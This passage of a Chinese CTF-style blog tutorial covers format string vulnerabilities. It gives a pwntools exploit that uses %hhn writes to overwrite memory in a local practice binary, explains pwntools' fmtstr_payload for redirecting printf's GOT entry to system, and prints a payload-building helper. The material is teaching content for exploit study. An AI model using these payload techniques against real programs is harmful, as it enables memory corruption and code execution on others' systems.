+<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>变量在内存中都是以字节的格式存储的，在 x86、x64 中是按照小端存储的，格式化字符串里面有两个标志用的上了：<br>h：对于整数类型，printf 期待一个从 short 提升的 int 尺寸的整型参数<br>hh：对于整型类型，printf 期待一个从 char 提升的 int 尺寸的整形参数</p>
+<p>意思是说：hhn 写入的就是单字节，hn 写入的就是双字节。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">b_addr=<span class="number">0x0804A028</span></span><br><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%104x&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#sh.sendline(fmtstr_payload(6, &#123;0x804A028:0x12345678&#125;))</span></span><br><span class="line"><span class="comment">#pwntools带着一个函数,很方便</span></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>前面的那一串 p32()，每算是 4 字符，这样到 %6$hhn 前面就是：16+104=120，也就是 0x78</p>
+<p>再加上 222 就是 342，也就是 0x156，然后依次是：0x234、0x312，又因为 hh 是写入单字节的，又是小端存储，也就是只能取后边两个，所以连起来就是 0x12345678</p>
+<p><strong>ps：</strong></p>
+<p>对于格式化字符串漏洞的题可以用pwntools的工具fatstr_payload（）来简化构造payload。</p>
+<blockquote>
+<p>fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)<br>第一个参数表示格式化字符串的偏移；<br>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT:<br>systemAddress}；本题是将0804a048处改为0x2223322<br>第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；<br>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。<br>fmtstr_payload函数返回的就是payload</p>
+</blockquote>
+<p>但是我们一般用的格式是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, &#123;printf_got: system_addr&#125;)(偏移，&#123;原地址：目的地址&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这是专门为32位格式化漏洞的函数。</p>
+<p>下面是函数的源代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">fmt</span><span class="params">(prev, word, index)</span>:</span></span><br><span class="line"><span class="function">    <span class="keyword">if</span> prev &lt; word:</span></span><br><span class="line"><span class="function">        result </span>= word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + str(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    elif prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + str(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + str(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fmt_str(offset, size, addr, target):</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = len(payload)</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">coke_pwn</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/06/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">http://example.com/2022/06/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">coke_blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/04/27/Ta1xSMWdpXAREG4.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/06/30/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/"><img class="prev-cover" src="https://s2.loli.net/2022/04/27/UcmFwXj9zJ4eRob.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">缓冲区溢出原理</div></div></a></div><div class="next-post pull-right"><a href="/2022/06/30/%E5%A0%86%E4%B8%AD%E7%9A%84Off-By-One/"><img class="next-cover" src="https://s2.loli.net/2022/04/27/SYvnsq5BitWlVIN.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">堆中的Off-By-One</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/06/30/ASLR%E5%92%8CPIE%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E4%BD%9C%E7%94%A8/" title="ASLR和PIE的区别和作用"><img class="cover" src="https://s2.loli.net/2022/04/27/WgjmK4EG8cFq9iB.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-30</div><div class="title">ASLR和PIE的区别和作用</div></div></a></div><div><a href="/2022/06/30/BROP%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" title="BROP原理及利用"><img class="cover" src="https://s2.loli.net/2022/04/27/Nc6nEs3ih2gS15Z.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-30</div><div class="title">BROP原理及利用</div></div></a></div><div><a href="/2022/06/30/RELRO%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86/" title="RELRO保护原理"><img class="cover" src="https://s2.loli.net/2022/04/27/Nc6nEs3ih2gS15Z.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-30</div><div class="title">RELRO保护原理</div></div></a></div><div><a href="/2022/06/30/ret2csu%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/" title="ret2csu原理与利用"><img class="cover" src="https://s2.loli.net/2022/04/27/UcmFwXj9zJ4eRob.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-30</div><div class="title">ret2csu原理与利用</div></div></a></div><div><a href="/2022/06/30/%E5%A0%86%E4%B8%AD%E7%9A%84Off-By-One/" title="堆中的Off-By-One"><img class="cover" src="https://s2.loli.net/2022/04/27/SYvnsq5BitWlVIN.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-30</div><div class="title">堆中的Off-By-One</div></div></a></div><div><a href="/2022/06/30/%E5%A0%86%E5%88%A9%E7%94%A8/" title="堆利用"><img class="cover" src="https://s2.loli.net/2022/04/27/SYvnsq5BitWlVIN.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-30</div><div class="title">堆利用</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2021/12/31/aSDZHoQfiWcINnA.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">coke_pwn</div><div class="author-info__description">一物不知，深以为耻</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/coke-pwn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/rang-wo-kan-kan" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2269279877@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客,我娇贵的CTFer</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.1.</span> <span class="toc-text">格式转换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">基本原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">程序崩溃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98"><span class="toc-number">1.3.2.</span> <span class="toc-text">泄露内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E7%9A%84%E5%86%85%E5%AD%98"><span class="toc-number">1.3.3.</span> <span class="toc-text">泄露任意地址的内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E6%A0%88%E5%86%85%E5%AD%98"><span class="toc-number">1.3.4.</span> <span class="toc-text">覆盖栈内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="toc-number">1.3.5.</span> <span class="toc-text">覆盖任意地址内存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%B0%8F%E6%95%B0%E5%AD%97"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">覆盖小数字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%A4%A7%E6%95%B0%E5%AD%97"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">覆盖大数字</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/30/ASLR%E5%92%8CPIE%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E4%BD%9C%E7%94%A8/" title="ASLR和PIE的区别和作用"><img src="https://s2.loli.net/2022/04/27/WgjmK4EG8cFq9iB.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ASLR和PIE的区别和作用"/></a><div class="content"><a class="title" href="/2022/06/30/ASLR%E5%92%8CPIE%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E4%BD%9C%E7%94%A8/" title="ASLR和PIE的区别和作用">ASLR和PIE的区别和作用</a><time datetime="2022-06-30T12:51:41.831Z" title="发表于 2022-06-30 20:51:41">2022-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/30/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E2%80%94%E2%80%94Stack%20Canaries/" title="栈溢出保护原理——Stack Canaries"><img src="https://s2.loli.net/2022/04/27/Ta1xSMWdpXAREG4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="栈溢出保护原理——Stack Canaries"/></a><div class="content"><a class="title" href="/2022/06/30/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E2%80%94%E2%80%94Stack%20Canaries/" title="栈溢出保护原理——Stack Canaries">栈溢出保护原理——Stack Canaries</a><time datetime="2022-06-30T12:51:41.827Z" title="发表于 2022-06-30 20:51:41">2022-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/30/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/" title="缓冲区溢出原理"><img src="https://s2.loli.net/2022/04/27/UcmFwXj9zJ4eRob.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="缓冲区溢出原理"/></a><div class="content"><a class="title" href="/2022/06/30/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/" title="缓冲区溢出原理">缓冲区溢出原理</a><time datetime="2022-06-30T12:51:41.823Z" title="发表于 2022-06-30 20:51:41">2022-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="格式化字符串漏洞"><img src="https://s2.loli.net/2022/04/27/Ta1xSMWdpXAREG4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="格式化字符串漏洞"/></a><div class="content"><a class="title" href="/2022/06/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="格式化字符串漏洞">格式化字符串漏洞</a><time datetime="2022-06-30T12:51:41.818Z" title="发表于 2022-06-30 20:51:41">2022-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/30/%E5%A0%86%E4%B8%AD%E7%9A%84Off-By-One/" title="堆中的Off-By-One"><img src="https://s2.loli.net/2022/04/27/SYvnsq5BitWlVIN.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="堆中的Off-By-One"/></a><div class="content"><a class="title" href="/2022/06/30/%E5%A0%86%E4%B8%AD%E7%9A%84Off-By-One/" title="堆中的Off-By-One">堆中的Off-By-One</a><time datetime="2022-06-30T12:51:41.814Z" title="发表于 2022-06-30 20:51:41">2022-06-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2022/04/27/Ta1xSMWdpXAREG4.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By coke_pwn</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://rang-wo-kan-kan.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
